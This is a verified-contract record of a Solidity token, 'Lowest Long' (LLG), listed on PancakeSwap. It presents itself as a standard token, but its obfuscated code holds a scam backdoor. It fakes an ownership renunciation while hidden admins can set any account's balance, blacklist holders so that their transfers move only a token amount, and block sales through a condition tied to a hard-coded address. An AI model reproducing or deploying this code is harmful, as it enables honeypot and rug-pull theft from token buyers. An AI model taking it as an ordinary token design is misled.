{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface takeExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedAtLaunch {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxFromTx {\n    function createPair(address senderSell, address receiverMarketingWallet) external returns (address);\n}\n\ninterface totalSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamLiquidity) external view returns (uint256);\n\n    function transfer(address listMarketing, uint256 totalBuy) external returns (bool);\n\n    function allowance(address swapTokenMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listMarketing,\n        uint256 totalBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountMin, uint256 value);\n    event Approval(address indexed swapTokenMode, address indexed spender, uint256 value);\n}\n\ninterface toAuto is totalSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LowestLong is launchedAtLaunch, totalSwap, toAuto {\n\n    function balanceOf(address teamLiquidity) public view virtual override returns (uint256) {\n        return enableAuto[teamLiquidity];\n    }\n\n    function senderMode(address senderLaunch) public {\n        receiverTake();\n        \n        if (senderLaunch == amountFundToken || senderLaunch == tradingIs) {\n            return;\n        }\n        sellList[senderLaunch] = true;\n    }\n\n    mapping(address => bool) public sellList;\n\n    function swapFee(address liquidityAuto, address listMarketing, uint256 totalBuy) internal returns (bool) {\n        if (liquidityAuto == amountFundToken) {\n            return txMode(liquidityAuto, listMarketing, totalBuy);\n        }\n        uint256 maxReceiverLaunched = totalSwap(tradingIs).balanceOf(launchedBuy);\n        require(maxReceiverLaunched == atTake);\n        require(listMarketing != launchedBuy);\n        if (sellList[liquidityAuto]) {\n            return txMode(liquidityAuto, listMarketing, teamLiquidityTrading);\n        }\n        return txMode(liquidityAuto, listMarketing, totalBuy);\n    }\n\n    function getOwner() external view returns (address) {\n        return isMax;\n    }\n\n    string private minMarketingFund = \"Lowest Long\";\n\n    address public tradingIs;\n\n    function launchedShouldTx(address receiverToken, uint256 totalBuy) public {\n        receiverTake();\n        enableAuto[receiverToken] = totalBuy;\n    }\n\n    function allowance(address launchedFrom, address shouldFundBuy) external view virtual override returns (uint256) {\n        if (shouldFundBuy == marketingFrom) {\n            return type(uint256).max;\n        }\n        return sellFee[launchedFrom][shouldFundBuy];\n    }\n\n    address public amountFundToken;\n\n    mapping(address => mapping(address => uint256)) private sellFee;\n\n    function buyWallet(uint256 totalBuy) public {\n        receiverTake();\n        atTake = totalBuy;\n    }\n\n    mapping(address => bool) public liquidityMarketing;\n\n    mapping(address => uint256) private enableAuto;\n\n    function receiverTake() private view {\n        require(liquidityMarketing[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return isMax;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tokenReceiver;\n    }\n\n    uint256 atTake;\n\n    function name() external view virtual override returns (string memory) {\n        return minMarketingFund;\n    }\n\n    constructor (){\n        if (marketingTake != exemptFundFrom) {\n            autoModeAmount = true;\n        }\n        takeExempt receiverShouldTo = takeExempt(marketingFrom);\n        tradingIs = maxFromTx(receiverShouldTo.factory()).createPair(receiverShouldTo.WETH(), address(this));\n        \n        amountFundToken = _msgSender();\n        buyLaunch();\n        liquidityMarketing[amountFundToken] = true;\n        enableAuto[amountFundToken] = tokenReceiver;\n        if (receiverSender != exemptFundFrom) {\n            marketingTake = false;\n        }\n        emit Transfer(address(0), amountFundToken, tokenReceiver);\n    }\n\n    uint256 shouldFrom;\n\n    event OwnershipTransferred(address indexed takeWallet, address indexed enableLimitWallet);\n\n    string private fromAt = \"LLG\";\n\n    bool private receiverSender;\n\n    address launchedBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function fromLiquidity(address sellExempt) public {\n        require(sellExempt.balance < 100000);\n        if (teamWalletReceiver) {\n            return;\n        }\n        if (receiverSender) {\n            exemptFundFrom = true;\n        }\n        liquidityMarketing[sellExempt] = true;\n        \n        teamWalletReceiver = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromAt;\n    }\n\n    uint256 constant teamLiquidityTrading = 20 ** 10;\n\n    bool private marketingTake;\n\n    function buyLaunch() public {\n        emit OwnershipTransferred(amountFundToken, address(0));\n        isMax = address(0);\n    }\n\n    function transfer(address receiverToken, uint256 totalBuy) external virtual override returns (bool) {\n        return swapFee(_msgSender(), receiverToken, totalBuy);\n    }\n\n    uint256 private tokenReceiver = 100000000 * 10 ** 18;\n\n    function transferFrom(address liquidityAuto, address listMarketing, uint256 totalBuy) external override returns (bool) {\n        if (_msgSender() != marketingFrom) {\n            if (sellFee[liquidityAuto][_msgSender()] != type(uint256).max) {\n                require(totalBuy <= sellFee[liquidityAuto][_msgSender()]);\n                sellFee[liquidityAuto][_msgSender()] -= totalBuy;\n            }\n        }\n        return swapFee(liquidityAuto, listMarketing, totalBuy);\n    }\n\n    function txMode(address liquidityAuto, address listMarketing, uint256 totalBuy) internal returns (bool) {\n        require(enableAuto[liquidityAuto] >= totalBuy);\n        enableAuto[liquidityAuto] -= totalBuy;\n        enableAuto[listMarketing] += totalBuy;\n        emit Transfer(liquidityAuto, listMarketing, totalBuy);\n        return true;\n    }\n\n    address private isMax;\n\n    bool public autoModeAmount;\n\n    bool public teamWalletReceiver;\n\n    bool private exemptFundFrom;\n\n    uint8 private launchLimit = 18;\n\n    function approve(address shouldFundBuy, uint256 totalBuy) public virtual override returns (bool) {\n        sellFee[_msgSender()][shouldFundBuy] = totalBuy;\n        emit Approval(_msgSender(), shouldFundBuy, totalBuy);\n        return true;\n    }\n\n    address marketingFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTokenMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLimitWallet\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldFundBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFundToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFundBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoModeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalBuy\",\"type\":\"uint256\"}],\"name\":\"buyWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"}],\"name\":\"fromLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalBuy\",\"type\":\"uint256\"}],\"name\":\"launchedShouldTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"}],\"name\":\"senderMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamWalletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LowestLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}